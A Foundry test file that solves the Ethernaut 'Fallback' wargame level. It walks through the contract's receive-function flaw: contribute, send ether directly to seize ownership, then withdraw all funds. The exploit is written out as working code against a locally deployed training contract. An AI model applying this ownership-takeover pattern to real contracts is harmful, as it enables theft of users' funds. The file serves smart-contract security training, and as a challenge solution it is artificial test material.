// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/01-Fallback/FallbackFactory.sol";
import "../core/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Due to the receive function, it is possible to become owner
        // and take possession of the funds by:
        // 1. contribute
        ethernautFallback.contribute{value: 0.0001 ether}();
        // 2. send ether to the contract
        (bool success,) = address(ethernautFallback).call{value: 0.001 ether}("");
        if (!success) revert("Low level call failed");
        // 3. withdraw
        ethernautFallback.withdraw();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
